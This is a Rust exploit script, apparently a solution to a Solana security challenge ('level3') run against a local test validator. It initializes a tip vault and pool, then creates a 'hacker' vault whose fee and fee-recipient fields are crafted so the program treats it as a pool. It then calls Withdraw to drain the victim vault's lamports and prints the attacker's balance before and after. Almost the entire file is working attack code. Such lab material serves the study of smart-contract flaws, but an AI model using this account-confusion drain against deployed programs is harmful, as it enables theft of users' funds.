use solana_client::rpc_client::RpcClient;

use solana_program::{
        pubkey::Pubkey,
        instruction::{AccountMeta, Instruction},
    };
use solana_sdk::{
        system_program,
        signature::{Keypair, read_keypair_file}, 
        signer::Signer, 
        commitment_config::CommitmentConfig,
        transaction::Transaction,
        native_token::LAMPORTS_PER_SOL,
        sysvar,
    };

use borsh::{BorshSerialize, BorshDeserialize};

use owo_colors::OwoColorize;

#[derive(Debug, BorshDeserialize, BorshSerialize)]
pub enum TipInstruction {
    Initialize {
        seed: u8,
        fee: f64,
        fee_recipient: Pubkey,
    },
    CreatePool,
    Tip { amount: u64 },
    Withdraw { amount: u64 },
}

#[repr(C)]
#[derive(Clone, Copy, Debug, Default, PartialEq, BorshSerialize, BorshDeserialize)]
pub struct TipPool {
    pub withdraw_authority: Pubkey,
    pub value: u64,
    pub vault: Pubkey,
}

pub const TIP_POOL_LEN: u64 = 32 + 8 + 32;

#[repr(C)]
#[derive(Clone, Copy, Debug, Default, PartialEq, BorshSerialize, BorshDeserialize)]
pub struct Vault {
    pub creator: Pubkey,
    pub fee: f64,              //reserved for future use
    pub fee_recipient: Pubkey, //reserved for future use
    pub seed: u8,
}
pub const VAULT_LEN: u64 = 32 + 8 + 32 + 1;

fn main() {

    let programa_keypair = read_keypair_file("./target/so/level3-keypair.json").unwrap();
    let programa = programa_keypair.pubkey();

    let cliente1 = String::from("http://localhost:8899");

    let init_addr = Keypair::new();

    let env = RpcClient::new_with_commitment(cliente1, CommitmentConfig::confirmed());

    match env.request_airdrop(&init_addr.pubkey(), LAMPORTS_PER_SOL) {
        Ok(sig) => loop {
            if let Ok(confirmed) = env.confirm_transaction(&sig) {
                if confirmed {
                    println!("Transaction: {} Status: {}", sig, confirmed);
                    break;
                }
            }
        },
        Err(_) => println!("Error requesting airdrop"),
    };


    let seed1: u8 = 3;
    let fee1: f64 = 1000000.00;
    let vault_address = Pubkey::create_program_address(&[&[seed1]], &programa).unwrap();

    // Initialize uses "VAULT_LEN" on the backend side
    println!("");
    println!("{}", "Initializing...".purple().bold());
    println!("");
    let tx_init = Instruction {
        program_id: programa,
        accounts: vec![
            AccountMeta::new(vault_address, false),
            AccountMeta::new(init_addr.pubkey(), true),
            AccountMeta::new_readonly(sysvar::rent::id(), false),
            AccountMeta::new_readonly(system_program::id(), false),
        ],
        data: TipInstruction::Initialize { seed: seed1, fee: fee1, fee_recipient: init_addr.pubkey(), }
        .try_to_vec()
        .unwrap(),
    };

    let recent_blockhash = env.get_latest_blockhash().unwrap();

    let tx_init = Transaction::new_signed_with_payer(
        &[tx_init],
        Some(&init_addr.pubkey()),
        &[&init_addr],
        recent_blockhash,
    );
        
    env.send_and_confirm_transaction(&tx_init).unwrap();

    let with_addr = Keypair::new();
    let pool = Keypair::new();

    match env.request_airdrop(&with_addr.pubkey(), LAMPORTS_PER_SOL) {
        Ok(sig) => loop {
            if let Ok(confirmed) = env.confirm_transaction(&sig) {
                if confirmed {
                    println!("Transaction: {} Status: {}", sig, confirmed);
                    break;
                }
            }
        },
        Err(_) => println!("Error requesting airdrop"),
        };
        
    // setting space exemption for tip
    let m_space_tip :u64 = TIP_POOL_LEN;
    let space_t :usize = m_space_tip as usize;
    //let space_t = u64 = 32 + 8 + 32;
    let rent_exemption_amount_t = env.get_minimum_balance_for_rent_exemption(space_t).unwrap();

    // CREATE POOL USES "TipPool"
    let create_pool  = solana_program::system_instruction::create_account(
            &with_addr.pubkey(), // from
            &pool.pubkey(), // to
            rent_exemption_amount_t, // lamports
            m_space_tip, // space
            &programa, //owner
    );

    let recent_blockhash = env.get_latest_blockhash().unwrap();

    let tx = Transaction::new_signed_with_payer(
        &[create_pool],
        Some(&with_addr.pubkey()),
        &[&with_addr, &pool], // pool must sign the Transaction in order to successfully create the acc
        recent_blockhash,
    );
    env.send_and_confirm_transaction(&tx).unwrap();

    println!("");
    println!("{}", "Creating pool...".purple().bold());
    println!("");
    let tx_pool = Instruction {
        program_id: programa,
        accounts: vec![
            AccountMeta::new(vault_address, false),
            AccountMeta::new_readonly(with_addr.pubkey(), true),
            AccountMeta::new(pool.pubkey(), false),
        ],
        data: TipInstruction::CreatePool.try_to_vec().unwrap(),
    };

    let recent_blockhash = env.get_latest_blockhash().unwrap();

    let tx_pool = Transaction::new_signed_with_payer(
        &[tx_pool],
        Some(&with_addr.pubkey()),
        &[&with_addr],
        recent_blockhash,
    );
        
    env.send_and_confirm_transaction(&tx_pool).unwrap();

    println!("{}", "Tipping pool...".purple().bold());
    println!("");
    let tx_tip = Instruction {
        program_id: programa,
        accounts: vec![
            AccountMeta::new(vault_address, false),
            AccountMeta::new(pool.pubkey(), false),
            AccountMeta::new(init_addr.pubkey(), true),
            AccountMeta::new_readonly(system_program::id(), false),
        ],
        data: TipInstruction::Tip { amount: rent_exemption_amount_t }.try_to_vec().unwrap(),
    };

    let recent_blockhash = env.get_latest_blockhash().unwrap();

    let tx_tip = Transaction::new_signed_with_payer(
        &[tx_tip],
        Some(&init_addr.pubkey()),
        &[&init_addr],
        recent_blockhash,
    );
        
    env.send_and_confirm_transaction(&tx_tip).unwrap();

    // setting space exemption for vault
    let m_space_vault :u64 = VAULT_LEN;
    let space_v :usize = m_space_vault as usize;
    //let space_v = u64 = 32 + 8 + 32 +1;
    let rent_exemption_amount_v = env.get_minimum_balance_for_rent_exemption(space_v).unwrap();
    let rent_hack = rent_exemption_amount_v as f64;
    
    let hacker = Keypair::new();
    
    // Initialize uses "VAULT_LEN" on the backend side
    println!("");
    println!("{}", "Initializing hacker vault acc to steal...".purple().bold());
    println!("");

    match env.request_airdrop(&hacker.pubkey(), LAMPORTS_PER_SOL) {
        Ok(sig) => loop {
            if let Ok(confirmed) = env.confirm_transaction(&sig) {
                if confirmed {
                    println!("Transaction: {} Status: {}", sig, confirmed);
                    break;
                }
            }
        },
        Err(_) => println!("Error requesting airdrop"),
    };

    let seed2: u8 = 5;
    let vault_hack = Pubkey::create_program_address(&[&[seed2]], &programa).unwrap();

    let tx_init_hack = Instruction {
        program_id: programa,
        accounts: vec![
            AccountMeta::new(vault_hack, false),
            AccountMeta::new(hacker.pubkey(), true),
            AccountMeta::new_readonly(sysvar::rent::id(), false),
            AccountMeta::new_readonly(system_program::id(), false),
        ],
        data: TipInstruction::Initialize { seed: seed2, fee: rent_hack, fee_recipient: vault_address, }
        .try_to_vec()
        .unwrap(),
    };
    let recent_blockhash = env.get_latest_blockhash().unwrap();

    let tx_init_hack = Transaction::new_signed_with_payer(
        &[tx_init_hack],
        Some(&hacker.pubkey()),
        &[&hacker],
        recent_blockhash,
    );
        
    env.send_and_confirm_transaction(&tx_init_hack).unwrap();

    let amount_steal = env.get_account(&vault_address).unwrap().lamports;
    let hacker_before = env.get_account(&hacker.pubkey()).unwrap().lamports;

    let tx_steal = Instruction {
        program_id: programa,
        accounts: vec![
            AccountMeta::new(vault_address, false),
            AccountMeta::new(vault_hack, false),
            AccountMeta::new(hacker.pubkey(), true),
            AccountMeta::new_readonly(system_program::id(), false),
        ],
        data: TipInstruction::Withdraw { amount: amount_steal }.try_to_vec().unwrap(),
    };

    let recent_blockhash = env.get_latest_blockhash().unwrap();
    let tx_steal = Transaction::new_signed_with_payer(
        &[tx_steal],
        Some(&hacker.pubkey()),
        &[&hacker],
        recent_blockhash,
    );
        
    env.send_and_confirm_transaction(&tx_steal).unwrap();

    let hacker_after = env.get_account(&hacker.pubkey()).unwrap().lamports;

    println!("");
    println!("{} {}", "Hacker address: ".green().bold(), hacker.pubkey());
    println!("{} {:?}", "Hacker amount of lamports before the exploit: ".green().bold(), hacker_before);
    println!("{} {:?}", "Hacker amount of lamports after the exploit: ".green().bold(), hacker_after);
    println!("");
}